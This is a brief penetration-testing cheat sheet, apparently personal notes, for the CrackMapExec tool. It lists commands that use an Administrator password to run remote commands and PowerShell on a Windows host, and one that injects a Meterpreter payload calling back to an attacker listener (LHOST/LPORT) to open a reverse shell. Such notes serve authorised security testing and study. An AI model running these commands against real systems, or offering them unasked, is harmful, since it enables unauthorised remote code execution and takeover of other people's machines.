---
title: crackmapexec
author: i4
date: M11-02-2022
---
### Testing creds
`crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami`
#### Execute powershell commands
`crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'`
#### With meterpreter shell
`sudo cme 192.168.215.104 -u 'Administrator' -p 'P@ssw0rd' -M met_inject -o LHOST=192.168.215.109 LPORT=444`

